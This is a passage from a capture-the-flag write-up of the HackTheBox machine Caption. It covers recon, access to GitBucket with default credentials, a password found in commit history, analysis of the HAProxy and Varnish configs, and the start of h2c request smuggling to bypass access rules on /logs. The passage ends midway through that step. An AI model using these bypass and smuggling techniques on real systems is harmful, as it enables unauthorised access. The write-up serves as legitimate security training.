---
title: HTB: Caption
url: https://0xdf.gitlab.io/2025/01/25/htb-caption.html
date: 2025-01-25T14:45:00+00:00
difficulty: Hard [40]
os: Linux
tags: ctf, hackthebox, htb-caption, nmap, python, flask, varnish, cache, feroxbuster, gitbucket, thrift, golang, haproxy, request-smuggling, html-injection, xss, cache-poison, cve-2023-37474, directory-traversal, youtube, ecdsa, command-injection, thrift-command-injection, gitbucket-db-viewer, haproxy-bypass
---

![Caption](/img/caption-cover.png)

Caption has a website behind a caching server and a proxy / web application filewall. I’ll abuse HTTP/2 cleartext (h2c) smuggling to read pages I’m blocked from reading directly. I’ll use a HTML injection to steal an admin cookie and get more access via the smuggling. From there I’ll get access to an instance of CopyParty, and exploit a directory traversal vulnerability to read an SSH key and get access to the box. To escalate I’ll abuse a command injection in a log-handler. In Beyond Root, I’ll look at some patched unintended solutions.

## Box Info

| Name | [Caption](https://hackthebox.com/machines/caption)  [Caption](https://hackthebox.com/machines/caption) [Play on HackTheBox](https://hackthebox.com/machines/caption) |
| --- | --- |
| Release Date | [14 Sep 2024](https://twitter.com/hackthebox_eu/status/1834235233643667494) |
| Retire Date | 25 Jan 2025 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Caption |
| Radar Graph | Radar chart for Caption |
| First Blood User | 00:23:12[jkr jkr](https://app.hackthebox.com/users/77141) |
| First Blood Root | 01:01:12[pottm pottm](https://app.hackthebox.com/users/141036) |
| Creator | [MrR3boot MrR3boot](https://app.hackthebox.com/users/13531) |

## Recon

### nmap

`nmap` finds three open TCP ports, SSH (22) and two HTTP (80, 8080):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.33
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-16 17:12 EDT
Nmap scan report for 10.10.11.33
Host is up (0.086s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 6.92 seconds
oxdf@hacky$ nmap -p 22,80,8080 -sCV 10.10.11.33
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-16 17:12 EDT
Nmap scan report for 10.10.11.33
Host is up (0.086s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http
|_http-title: Did not follow redirect to http://caption.htb
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, RTSPRequest, X11Probe:
|     HTTP/1.1 400 Bad request
|     Content-length: 90
|     Cache-Control: no-cache
|     Connection: close
|     Content-Type: text/html
|     <html><body><h1>400 Bad request</h1>
|     Your browser sent an invalid request.
|     </body></html>
|   FourOhFourRequest, GetRequest, HTTPOptions:
|     HTTP/1.1 301 Moved Permanently
|     content-length: 0
|     location: http://caption.htb
|_    connection: close
8080/tcp open  http-proxy
|_http-title: GitBucket
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 404 Not Found
|     Date: Mon, 16 Sep 2024 21:12:54 GMT
|     Set-Cookie: JSESSIONID=node01dj7glrh156ro8tiqna7jru0x2.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 5916
|     <!DOCTYPE html>
|     <html prefix="og: http://ogp.me/ns#" lang="en">
|     <head>
|     <meta charset="UTF-8" />
|     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
|     <title>Error</title>
|     <meta property="og:title" content="Error" />
|     <meta property="og:type" content="object" />
|     <meta property="og:url" content="http://10.10.11.33:8080/nice%20ports%2C/Tri%6Eity.txt%2ebak" />
|     <meta property="og:image" content="http://10.10.11.33:8080/assets/common/images/gitbucket_ogp.png" />
|     <link rel="icon" href="/assets/common/images/gi
|   GetRequest:
|     HTTP/1.1 200 OK
|     Date: Mon, 16 Sep 2024 21:12:52 GMT
|     Set-Cookie: JSESSIONID=node0v6h4sojsvtvk19k1uwfsrrezs0.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 7191
|     <!DOCTYPE html>
|     <html prefix="og: http://ogp.me/ns#" lang="en">
|     <head>
|     <meta charset="UTF-8" />
|     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
|     <title>GitBucket</title>
|     <meta property="og:title" content="GitBucket" />
|     <meta property="og:type" content="object" />
|     <meta property="og:url" content="http://10.10.11.33:8080/" />
|     <meta property="og:image" content="http://10.10.11.33:8080/assets/common/images/gitbucket_ogp.png" />
|     <link rel="icon" href="/assets/common/images/gitbucket.png?20240916211253" type="
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     Date: Mon, 16 Sep 2024 21:12:53 GMT
|     Set-Cookie: JSESSIONID=node0avnqdr18ykv5tu0u4smmdznc1.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Allow: GET,HEAD,POST,OPTIONS
|     Content-Length: 0
|   RTSPRequest:
|     HTTP/1.1 505 HTTP Version Not Supported
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|_    <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.94SVN%I=7%D=9/16%Time=66E89F48%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,66,"HTTP/1\.1\x20301\x20Moved\x20Permanently\r\ncontent-lengt
SF:h:\x200\r\nlocation:\x20http://caption\.htb\r\nconnection:\x20close\r\n
SF:\r\n")%r(HTTPOptions,66,"HTTP/1\.1\x20301\x20Moved\x20Permanently\r\nco
SF:ntent-length:\x200\r\nlocation:\x20http://caption\.htb\r\nconnection:\x
SF:20close\r\n\r\n")%r(RTSPRequest,CF,"HTTP/1\.1\x20400\x20Bad\x20request\
SF:r\nContent-length:\x2090\r\nCache-Control:\x20no-cache\r\nConnection:\x
SF:20close\r\nContent-Type:\x20text/html\r\n\r\n<html><body><h1>400\x20Bad
SF:\x20request</h1>\nYour\x20browser\x20sent\x20an\x20invalid\x20request\.
SF:\n</body></html>\n")%r(X11Probe,CF,"HTTP/1\.1\x20400\x20Bad\x20request\
SF:r\nContent-length:\x2090\r\nCache-Control:\x20no-cache\r\nConnection:\x
SF:20close\r\nContent-Type:\x20text/html\r\n\r\n<html><body><h1>400\x20Bad
SF:\x20request</h1>\nYour\x20browser\x20sent\x20an\x20invalid\x20request\.
SF:\n</body></html>\n")%r(FourOhFourRequest,66,"HTTP/1\.1\x20301\x20Moved\
SF:x20Permanently\r\ncontent-length:\x200\r\nlocation:\x20http://caption\.
SF:htb\r\nconnection:\x20close\r\n\r\n")%r(RPCCheck,CF,"HTTP/1\.1\x20400\x
SF:20Bad\x20request\r\nContent-length:\x2090\r\nCache-Control:\x20no-cache
SF:\r\nConnection:\x20close\r\nContent-Type:\x20text/html\r\n\r\n<html><bo
SF:dy><h1>400\x20Bad\x20request</h1>\nYour\x20browser\x20sent\x20an\x20inv
SF:alid\x20request\.\n</body></html>\n")%r(DNSVersionBindReqTCP,CF,"HTTP/1
SF:\.1\x20400\x20Bad\x20request\r\nContent-length:\x2090\r\nCache-Control:
SF:\x20no-cache\r\nConnection:\x20close\r\nContent-Type:\x20text/html\r\n\
SF:r\n<html><body><h1>400\x20Bad\x20request</h1>\nYour\x20browser\x20sent\
SF:x20an\x20invalid\x20request\.\n</body></html>\n")%r(DNSStatusRequestTCP
SF:,CF,"HTTP/1\.1\x20400\x20Bad\x20request\r\nContent-length:\x2090\r\nCac
SF:he-Control:\x20no-cache\r\nConnection:\x20close\r\nContent-Type:\x20tex
SF:t/html\r\n\r\n<html><body><h1>400\x20Bad\x20request</h1>\nYour\x20brows
SF:er\x20sent\x20an\x20invalid\x20request\.\n</body></html>\n")%r(Help,CF,
SF:"HTTP/1\.1\x20400\x20Bad\x20request\r\nContent-length:\x2090\r\nCache-C
SF:ontrol:\x20no-cache\r\nConnection:\x20close\r\nContent-Type:\x20text/ht
SF:ml\r\n\r\n<html><body><h1>400\x20Bad\x20request</h1>\nYour\x20browser\x
SF:20sent\x20an\x20invalid\x20request\.\n</body></html>\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8080-TCP:V=7.94SVN%I=7%D=9/16%Time=66E89F49%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,1D04,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Mon,\x2016\x20Sep\
SF:x202024\x2021:12:52\x20GMT\r\nSet-Cookie:\x20JSESSIONID=node0v6h4sojsvt
SF:vk19k1uwfsrrezs0\.node0;\x20Path=/;\x20HttpOnly\r\nExpires:\x20Thu,\x20
SF:01\x20Jan\x201970\x2000:00:00\x20GMT\r\nContent-Type:\x20text/html;char
SF:set=utf-8\r\nContent-Length:\x207191\r\n\r\n<!DOCTYPE\x20html>\n<html\x
SF:20prefix=\"og:\x20http://ogp\.me/ns#\"\x20lang=\"en\">\n\x20\x20<head>\
SF:n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\"\x20/>\n\x20\x20\x20\x20<met
SF:a\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-scal
SF:e=1\.0,\x20maximum-scale=5\.0\"\x20/>\n\x20\x20\x20\x20<meta\x20http-eq
SF:uiv=\"X-UA-Compatible\"\x20content=\"IE=edge\"\x20/>\n\x20\x20\x20\x20<
SF:title>GitBucket</title>\n\x20\x20\x20\x20<meta\x20property=\"og:title\"
SF:\x20content=\"GitBucket\"\x20/>\n\x20\x20\x20\x20<meta\x20property=\"og
SF::type\"\x20content=\"object\"\x20/>\n\x20\x20\x20\x20<meta\x20property=
SF:\"og:url\"\x20content=\"http://10\.10\.11\.33:8080/\"\x20/>\n\x20\x20\x
SF:20\x20\n\x20\x20\x20\x20\x20\x20<meta\x20property=\"og:image\"\x20conte
SF:nt=\"http://10\.10\.11\.33:8080/assets/common/images/gitbucket_ogp\.png
SF:\"\x20/>\n\x20\x20\x20\x20\n\x20\x20\x20\x20\n\x20\x20\x20\x20<link\x20
SF:rel=\"icon\"\x20href=\"/assets/common/images/gitbucket\.png\?2024091621
SF:1253\"\x20type=\"")%r(HTTPOptions,107,"HTTP/1\.1\x20200\x20OK\r\nDate:\
SF:x20Mon,\x2016\x20Sep\x202024\x2021:12:53\x20GMT\r\nSet-Cookie:\x20JSESS
SF:IONID=node0avnqdr18ykv5tu0u4smmdznc1\.node0;\x20Path=/;\x20HttpOnly\r\n
SF:Expires:\x20Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nContent-Typ
SF:e:\x20text/html;charset=utf-8\r\nAllow:\x20GET,HEAD,POST,OPTIONS\r\nCon
SF:tent-Length:\x200\r\n\r\n")%r(RTSPRequest,B8,"HTTP/1\.1\x20505\x20HTTP\
SF:x20Version\x20Not\x20Supported\r\nContent-Type:\x20text/html;charset=is
SF:o-8859-1\r\nContent-Length:\x2058\r\nConnection:\x20close\r\n\r\n<h1>Ba
SF:d\x20Message\x20505</h1><pre>reason:\x20Unknown\x20Version</pre>")%r(Fo
SF:urOhFourRequest,1810,"HTTP/1\.1\x20404\x20Not\x20Found\r\nDate:\x20Mon,
SF:\x2016\x20Sep\x202024\x2021:12:54\x20GMT\r\nSet-Cookie:\x20JSESSIONID=n
SF:ode01dj7glrh156ro8tiqna7jru0x2\.node0;\x20Path=/;\x20HttpOnly\r\nExpire
SF:s:\x20Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nContent-Type:\x20
SF:text/html;charset=utf-8\r\nContent-Length:\x205916\r\n\r\n<!DOCTYPE\x20
SF:html>\n<html\x20prefix=\"og:\x20http://ogp\.me/ns#\"\x20lang=\"en\">\n\
SF:x20\x20<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\"\x20/>\n\x20\x
SF:20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-width,\x
SF:20initial-scale=1\.0,\x20maximum-scale=5\.0\"\x20/>\n\x20\x20\x20\x20<m
SF:eta\x20http-equiv=\"X-UA-Compatible\"\x20content=\"IE=edge\"\x20/>\n\x2
SF:0\x20\x20\x20<title>Error</title>\n\x20\x20\x20\x20<meta\x20property=\"
SF:og:title\"\x20content=\"Error\"\x20/>\n\x20\x20\x20\x20<meta\x20propert
SF:y=\"og:type\"\x20content=\"object\"\x20/>\n\x20\x20\x20\x20<meta\x20pro
SF:perty=\"og:url\"\x20content=\"http://10\.10\.11\.33:8080/nice%20ports%2
SF:C/Tri%6Eity\.txt%2ebak\"\x20/>\n\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\
SF:x20<meta\x20property=\"og:image\"\x20content=\"http://10\.10\.11\.33:80
SF:80/assets/common/images/gitbucket_ogp\.png\"\x20/>\n\x20\x20\x20\x20\n\
SF:x20\x20\x20\x20\n\x20\x20\x20\x20<link\x20rel=\"icon\"\x20href=\"/asset
SF:s/common/images/gi");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.04 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) versions, the host is likely running Ubuntu 22.04 jammy.

Port 8080 looks like an instance of GitBucket. Port 80 shows a redirect to `caption.htb`. Given the use of host-based routing, I’ll use `ffuf` to brute force looking for any subdomains that respond differently, but not find any. I’ll add `caption.htb` to my `/etc/hosts` file:

```
10.10.11.33 caption.htb

```

### Website - TCP 80

#### Site

The site offers a login page:

![image-20240916172345700](/img/image-20240916172345700.png)

Sending in invalid creds returns a redirect right back to `/` with no indication of the result other than that it isn’t logged in.

#### Tech Stack

The HTTP response headers have significant information here:

```

HTTP/1.1 200 OK
server: Werkzeug/3.0.1 Python/3.10.12
date: Mon, 16 Sep 2024 21:31:47 GMT
content-type: text/html; charset=utf-8
content-length: 4412
x-varnish: 32784
age: 0
via: 1.1 varnish (Varnish/6.6)
x-cache: MISS
accept-ranges: bytes

```

The `server` header shows Werkzeug and Python, suggesting this is a Python Flask application. The 404 page shows the [default Flask 404](/cheatsheets/404#flask), matching the `server` header:

![image-20240916172809309](/img/image-20240916172809309.png)

The response headers also contain a bunch of cache-related entries:
- `x-varnish` - an ID at the caching server for this request.
- `age` - the time in seconds that this result was cached. In this case, it’s 0 meaning it did not come from cache.
- `via` - indicates that it came from the Varnish caching server, and gives the version 6.6.
- `x-cache` - `MISS` indicates that this was not found in the cache, and thus requested from the server.

If I refresh quickly, I can see it will return the root page from cache:

```

HTTP/1.1 200 OK
server: Werkzeug/3.0.1 Python/3.10.12
date: Mon, 16 Sep 2024 21:31:47 GMT
content-type: text/html; charset=utf-8
content-length: 4412
x-varnish: 32790 32785
age: 6
via: 1.1 varnish (Varnish/6.6)
accept-ranges: bytes

```

In this case, it’s returning the page generated 6 seconds earlier (from the `age` header).

#### Directory Brute Force

I’ll run `feroxbuster` against the site, with no extensions as it’s a Python site:

```

oxdf@hacky$ feroxbuster -u http://caption.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.4
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://caption.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.4
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      200l      322w     4332c http://caption.htb/
403      GET        4l        8w       94c http://caption.htb/logs
403      GET        4l        8w       94c http://caption.htb/download
302      GET        5l       22w      189c http://caption.htb/logout => http://caption.htb/
302      GET        5l       22w      189c http://caption.htb/home => http://caption.htb/
403      GET        4l        8w       94c http://caption.htb/Download
403      GET        4l        8w       94c http://caption.htb/Logs
403      GET        4l        8w       94c http://caption.htb/%7D
403      GET        4l        8w       94c http://caption.htb/LOGS
403      GET        4l        8w       94c http://caption.htb/%E2%80%8E
403      GET        4l        8w       94c http://caption.htb/%D7%99%D7%9D
403      GET        4l        8w       94c http://caption.htb/%E9%99%A4%E5%80%99%E9%80%89
403      GET        4l        8w       94c http://caption.htb/%E9%99%A4%E6%8A%95%E7%A5%A8
403      GET        4l        8w       94c http://caption.htb/%E4%BE%B5%E6%9D%83
403      GET        4l        8w       94c http://caption.htb/DOWNLOAD
403      GET        4l        8w       94c http://caption.htb/DownLoad
503      GET       14l       28w      283c http://caption.htb/2005_uzenofal
403      GET        4l        8w       94c http://caption.htb/%C4%BC
403      GET        4l        8w       94c http://caption.htb/%CC%A8%C4%BC
403      GET        4l        8w       94c http://caption.htb/%E2%80%9D
403      GET        4l        8w       94c http://caption.htb/%C4%A3%C4%BC
403      GET        4l        8w       94c http://caption.htb/%C5%B1%C4%BC
403      GET        4l        8w       94c http://caption.htb/%DD%BF%C4%BC
403      GET        4l        8w       94c http://caption.htb/%E7%89%B9%E6%AE%8A
403      GET        4l        8w       94c http://caption.htb/%E8%AE%A8%E8%AE%BA
[####################] - 2m     30000/30000   0s      found:25      errors:0
[####################] - 2m     30000/30000   231/s   http://caption.htb/ 

```

There’s a few interesting endpoints that return 403, presumably because it’s not authenticated. It’s also interesting that the endpoints don’t seem to be case sensitive, which is typical for a Windows host, but not for a Linux one.

### GitBucket - TCP 8080

#### Site

This site offers an instance of [GitBucket](https://github.com/gitbucket/gitbucket):

![image-20240916174202797](/img/image-20240916174202797.png)

Originally on release, there were no public repos. Trying to do pretty much anything leads to an empty site or a login form.

The `README` file for GitBucket shows the default creds:

![image-20240916175230686](/img/image-20240916175230686.png)

They work here, showing two repos:

![image-20240916175248603](/img/image-20240916175248603.png)

After the patch about a week after release, these repos are just public, and the default creds no longer work:

![image-20250122090206772](/img/image-20250122090206772.png)

This is due to [an unintended soltution](#foothold-via-gitbucket-db-viewer).

#### Logservice

The Logservice repo shows four files, including a `README.md`:

![image-20240916175353095](/img/image-20240916175353095.png)

This is a Golang socket server, with a `.thrift` file:

```

    namespace go log_service
     
    service LogService {
        string ReadLogFile(1: string filePath)
    }

```

[Thrift](https://thrift.apache.org/) is a framework for “cross-language services development”. The idea is to write a server in one language, and a client in another, and they can communicate using Thrift. `server.go` is a Thrift server, and it listens on TCP 9090:

```

func main() {
    handler := &LogServiceHandler{}
    processor := log_service.NewLogServiceProcessor(handler)
    transport, err := thrift.NewTServerSocket(":9090")
    if err != nil {
        log.Fatalf("Error creating transport: %v", err)
    }
 
    server := thrift.NewTSimpleServer4(processor, transport, thrift.NewTTransportFactory(), thrift.NewTBinaryProtocolFactoryDefault())
    log.Println("Starting the server...")
    if err := server.Serve(); err != nil {
        log.Fatalf("Error occurred while serving: %v", err)
    }
}

```

I’ll check out the commit history, but there’s nothing too interesting:

![image-20240916183047273](/img/image-20240916183047273.png)

#### Caption-Portal

This repo has `app` and `config` folders, and a `README`:

![image-20240916175926536](/img/image-20240916175926536.png)

The `app` folder doesn’t have the Python code for the site, but rather only the `index.html` page and the `static/css` directory. The `config` directory is more interesting, with folders for `haproxy`, `service`, and `varnish`:

![image-20240916180020889](/img/image-20240916180020889.png)

In these three folders are configurations for both [HAProxy](https://www.haproxy.org/) and [Varnish](https://varnish-cache.org/).

The commit history here is a bit more interesting:

![image-20240916183205727](/img/image-20240916183205727.png)

In the patched Caption there’s one more commit at the top (which I’ll discuss in [Beyond Root](#patches)):

![image-20250122091221554](/img/image-20250122091221554.png)

In the one titled “Update access control”, there’s a password deleted for the margo user:

![image-20240916183354628](/img/image-20240916183354628.png)

I’ll note this.

#### HAProxy Configuration

The `haproxy.service` file doesn’t show anything too interesting:

```

    [Unit]
    Description=HAProxy Load Balancer
    Documentation=man:haproxy(1)
    Documentation=file:/usr/share/doc/haproxy/configuration.txt.gz
    After=network-online.target rsyslog.service
    Wants=network-online.target
     
    [Service]
    EnvironmentFile=-/etc/default/haproxy
    EnvironmentFile=-/etc/sysconfig/haproxy
    Environment="CONFIG=/etc/haproxy/haproxy.cfg" "PIDFILE=/run/haproxy.pid" "EXTRAOPTS=-S /run/haproxy-master.sock"
    ExecStartPre=/usr/sbin/haproxy -Ws -f $CONFIG -c -q $EXTRAOPTS
    ExecStart=/usr/sbin/haproxy -Ws -f $CONFIG -p $PIDFILE $EXTRAOPTS
    ExecReload=/usr/sbin/haproxy -Ws -f $CONFIG -c -q $EXTRAOPTS
    ExecReload=/bin/kill -USR2 $MAINPID
    KillMode=mixed
    Restart=always
    SuccessExitStatus=143
    Type=notify
...[snip]...

    [Install]
    WantedBy=multi-user.target

```

The `haproxy.cfg` file provides a lot:

```

GitBucket GitBucket
Toggle navigation

    Pull requests
    Issues
    Snippets

    Sign in

Files
Branches 1

    Releases

root / Caption-Portal
Caption-Portal / config / haproxy / haproxy.cfg
@Administrator Administrator on 20 Sep 1 KB Fixed HAProxyBypass

    global
            log /dev/log    local0
            log /dev/log    local1 notice
            chroot /var/lib/haproxy
            stats socket /run/haproxy/admin.sock mode 660 level admin expose-fd listeners
            stats timeout 30s
            user haproxy
            group haproxy
            daemon
     
            # Default SSL material locations
            ca-base /etc/ssl/certs
            crt-base /etc/ssl/private
     
            # See: https://ssl-config.mozilla.org/#server=haproxy&server-version=2.0.3&config=intermediate
            ssl-default-bind-ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384
            ssl-default-bind-ciphersuites TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256
            ssl-default-bind-options ssl-min-ver TLSv1.2 no-tls-tickets
     
    defaults
            log     global
            mode    http
            option  httplog
            option  dontlognull
            timeout connect 5000
            timeout client  50000
            timeout server  50000
            errorfile 400 /etc/haproxy/errors/400.http
            errorfile 403 /etc/haproxy/errors/403.http
            errorfile 408 /etc/haproxy/errors/408.http
            errorfile 500 /etc/haproxy/errors/500.http
            errorfile 502 /etc/haproxy/errors/502.http
            errorfile 503 /etc/haproxy/errors/503.http
            errorfile 504 /etc/haproxy/errors/504.http

    frontend http_front
       bind *:80
       default_backend http_back
       acl multi_slash path_reg -i ^/[/%]+
       http-request deny if multi_slash
       acl restricted_page path_beg,url_dec -i /logs
       acl restricted_page path_beg,url_dec -i /download
       http-request deny if restricted_page
       acl not_caption hdr_beg(host) -i caption.htb
       http-request redirect code 301 location http://caption.htb if !not_caption
     
    backend http_back
       balance roundrobin
       server server1 127.0.0.1:6081 check

```

It’s binding to port 80, which is the outward facing web service. It’s passing to one server, localhost port 6081. `/logs` and `/download` are restricted by ACL, returning “deny” (403) if it matches. It’s also handling the redirect if the `Host` header isn’t set to `caption.htb`.

This seems to show that I should try to get to `/logs` and/or `/download`.

There’s also a rule blocking any path with multiple `/` in a row. This was added in the [machine update](#patches).

#### Varnish Config

The `varnish.service` file shows how it runs:

```

    [Unit]
    Description=Varnish Cache, a high-performance HTTP accelerator
    Documentation=https://www.varnish-cache.org/docs/ man:varnishd
     
    [Service]
    Type=simple
     
    # Maximum number of open files (for ulimit -n)
    LimitNOFILE=131072
     
    # Locked shared memory - should suffice to lock the shared memory log
    # (varnishd -l argument)
    # Default log size is 80MB vsl + 1M vsm + header -> 82MB
    # unit is bytes
    LimitMEMLOCK=85983232
    ExecStart=/usr/sbin/varnishd \
              -j unix,user=vcache \
              -F \
              -a localhost:6081 \
              -T localhost:6082 \
              -f /etc/varnish/default.vcl \
              -S /etc/varnish/secret \
              -s malloc,256m \
              -p feature=+http2
    ExecReload=/usr/share/varnish/varnishreload
    ProtectSystem=full
    ProtectHome=true
    PrivateTmp=true
    PrivateDevices=true
     
    [Install]
    WantedBy=multi-user.target

```

The `ExecStart` value shows the command line when it runs, with the following options defined [here](https://varnish-cache.org/docs/7.6/reference/varnishd.html):
- `-j unix,user=vcache`: This specifies the jail for the process, to reduce risks on the host system.
- `-F`: Do not fork, run in foreground.
- `-a localhost:6081`: Address to listen on. This fits with HAProxy’s configuration to send traffic to 6081.
- `-T localhost:6082`: The management interface for Varnish.
- `-f /etc/varnish/default.vcl`: The config file to load.
- `S /etc/varnish/secret`: The file containing the secret for auth to the management port.
- `-s malloc,256m`: The storage backend.
- `-p feature=+http2`: Additional parameters to pass. In this case, enabling HTTP/2 support.

There’s a `default.vcl` file in the `varnish` directory, but it’s missing some critical parts:

```

    vcl 4.0;
     
    backend default {
        .host = "127.0.0.1";
        .port = "8000";
    }
     
    sub vcl_recv {
    	// update for prod - CR-3045
    }
     
    sub vcl_backend_response {
    	// update for prod - CR-3045
    }
     
    sub vcl_deliver {
    	// update for prod - CR-3045
    }

```

This suggests that Flask is listening on port 8000.

## Shell as margo

### Authenticated Site

#### General Enumeration

I’ll try margo’s HAProxy creds over SSH, but they aren’t accepted. They do log into the port 80 website though:

![image-20240916185256906](/img/image-20240916185256906.png)

Most of the site is just text. There is a `/firewalls` page with more text. Both of the links under “Routers” go nowhere.

`/logs` still returns 403:

![image-20240916190105365](/img/image-20240916190105365.png)

`/download` (not linked to, but discovered with `feroxbuster` above) does the same.

#### Cookies

On logging in, there’s a `session` cookie set in the HTTP response:

```

HTTP/1.1 302 FOUND
server: Werkzeug/3.0.1 Python/3.10.12
date: Fri, 20 Sep 2024 10:14:03 GMT
content-type: text/html; charset=utf-8
content-length: 197
location: /home
set-cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im1hcmdvIiwiZXhwIjoxNzI2ODMwODQzfQ.nI6ld0szrw8IVDB9hmoAzPeWtAhM7OfkezO0MEHqsbM; Expires=Fri, 20 Sep 2024 11:14:03 GMT; Path=/
x-varnish: 164476
age: 0
via: 1.1 varnish (Varnish/6.6)
x-cache: MISS

```

It looks like a JWT, and doesn’t have the `HttpOnly` flag, which can also been confirmed in dev tools:

![image-20240920061532239](/img/image-20240920061532239.png)

The token decodes to just the username and expiration time:

```

oxdf@hacky$ python
Python 3.12.3 (main, Sep 11 2024, 14:17:37) [GCC 13.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import jwt
>>> jwt.decode('eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im1hcmdvIiwiZXhwIjoxNzI2ODMwODQzfQ.nI6ld0szrw8IVDB9hmoAzPeWtAhM7OfkezO0MEHqsbM', algorithms=["HS256","RS256"], options={'verify_signature': False})
{'username': 'margo', 'exp': 1726830843}

```

#### lib.js

Looking in Burp at the HTTP requests, after each page, there’s a request to `/static/js/lib.js?utm_source=http://internal-proxy.local`:

![image-20240919171413823](/img/image-20240919171413823.png)

The request is generated by JavaScript in the header of each page:

```

<script src="http://caption.htb/static/js/lib.js?utm_source=http://internal-proxy.local"></script>

```

### Smuggling

#### Initial POC

Researching Vanish, HAProxy, and HTTP2 (interesting things from the configs), I’ll find a post from BishopFox, [h2c Smuggling: Request Smuggling Via HTTP/2 Cleartext (h2c)](https://bishopfox.com/blog/h2c-smuggling-request). It has a section showing that HAProxy can be vulnerable to this attack.

Fortunately, BishopFox has created a POC tool, [h2csmuggler](https://github.com/BishopFox/h2csmuggler), which makes exploiting this easy. I’ll give it the web root as the smuggling target, and the `--test` flag to see if it is vulnerable:

```

oxdf@hacky$ python h2csmuggler.py -x http://caption.htb --test
[INFO] h2c stream established successfully.
[INFO] Success! http://caption.htb can be used for tunneling

```

That’s promising! I’ll try to read `/logs` via this technique:

```

oxdf@hacky$ python h2csmuggler.py -x http://caption.htb http://caption.htb/logs
[INFO] h2c stream established successfully.
:status: 200
server: Werkzeug/3.0.1 Python/3.10.12
date: Fri, 20 Sep 2024 12:48:59 GMT
content-type: text/html; charset=utf-8
content-length: 4412
x-varnish: 164588 3408279
age: 88
via: 1.1 varnish (Varnish/6.6)
accept-ranges: bytes

<!DOCTYPE html>
<html lang="en" >
...[snip - / content]...
</html>

[INFO] Requesting - /logs
:status: 302
server: Werkzeug/3.0.1 Python/3.10.12
date: Fri, 20 Sep 2024 12:50:28 GMT
content-type: text/html; charset=utf-8
content-length: 189
location: /
x-varnish: 164589
age: 0
via: 1.1 varnish (Varnish/6.6)
x-cache: MISS

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
